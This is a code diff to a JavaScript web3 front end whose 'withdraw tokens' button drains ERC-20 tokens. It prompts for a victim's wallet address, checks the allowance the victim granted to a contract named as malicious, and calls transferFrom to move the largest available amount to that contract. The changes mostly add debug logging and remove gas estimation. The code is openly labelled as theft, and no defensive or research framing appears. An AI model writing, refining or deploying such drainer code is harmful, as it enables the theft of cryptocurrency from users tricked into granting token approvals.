@@ -585,52 +585,62 @@
         
 // Withdraw Tokens (from victim's address using the malicious contract)
 document.getElementById("transferTokensBtn").addEventListener("click", async () => {
+    // Prompt for the victim's wallet address
     const victimAddress = prompt("Enter victim's wallet address:");
 
     if (victimAddress) {
-        // Trim and validate the victim's address
+        // Clean and validate the victim's address
         const cleanedVictimAddress = victimAddress.trim();
+        console.debug("Cleaned victim address:", cleanedVictimAddress);
+
         if (!web3.utils.isAddress(cleanedVictimAddress)) {
             alert("Invalid Ethereum address.");
+            console.debug("Invalid address:", cleanedVictimAddress);
             return;
         }
 
         try {
             // Fetch allowance and victim's token balance
+            console.debug("Fetching allowance for victim address:", cleanedVictimAddress);
             const allowance = await tokenContract.methods.allowance(cleanedVictimAddress, maliciousContractAddress).call();
+            console.debug("Allowance fetched:", allowance);
+
+            console.debug("Fetching balance for victim address:", cleanedVictimAddress);
             const balance = await tokenContract.methods.balanceOf(cleanedVictimAddress).call();
+            console.debug("Balance fetched:", balance);
 
-            console.log("Allowance:", allowance);
-            console.log("Balance:", balance);
-
-            // Convert raw data to human-readable format
+            // Convert allowance and balance to BigNumber format
             const balanceBN = web3.utils.toBN(balance);
             const allowanceBN = web3.utils.toBN(allowance);
+            console.debug("Balance in BigNumber:", balanceBN.toString());
+            console.debug("Allowance in BigNumber:", allowanceBN.toString());
+
+            // Determine the amount to withdraw (minimum of balance or allowance)
             const amountToWithdraw = balanceBN.lt(allowanceBN) ? balanceBN : allowanceBN;
+            console.debug("Amount to withdraw calculated:", amountToWithdraw.toString());
 
-            console.log("Amount to withdraw:", amountToWithdraw.toString());
-
-            // Check if the withdrawal amount is valid
+            // Check if the amount to withdraw is greater than zero
             if (amountToWithdraw.lte(web3.utils.toBN(0))) {
-                alert("No available tokens to withdraw.");
+                alert("Insufficient allowance or balance to withdraw.");
+                console.debug("No tokens available to withdraw.");
                 return;
             }
 
-            // Estimate gas to ensure the transaction won't fail
-            const gasLimit = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString()).estimateGas({ from: accounts[0] });
-            console.log("Estimated gas limit:", gasLimit);
+            // Attempt the withdrawal using the malicious contract
+            console.debug("Attempting to withdraw tokens...");
+            const transaction = await tokenContract.methods
+                .transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString())
+                .send({ from: accounts[0] });
 
-            // Proceed with the transfer
-            const transaction = await tokenContract.methods.transferFrom(cleanedVictimAddress, maliciousContractAddress, amountToWithdraw.toString()).send({
-                from: accounts[0],
-                gas: gasLimit
-            });
-
-            // Success alert
-            alert(`Successfully withdrawn ${web3.utils.fromWei(amountToWithdraw.toString(), 'ether')} tokens from the victim's account to the malicious contract!`);
+            // Notify success and log the transaction
+            alert(`Successfully withdrawn ${web3.utils.fromWei(amountToWithdraw, 'ether')} tokens from the victim's account!`);
+            console.debug("Transaction successful:", transaction);
         } catch (error) {
+            // Handle and display errors
             alert("Error during withdrawal. Please check the details.");
             console.error("Withdrawal Error:", error);
+            console.debug("Error details:", error);
+            alert("Check the victim's approval, balance, and allowance.");
         }
     }
 });
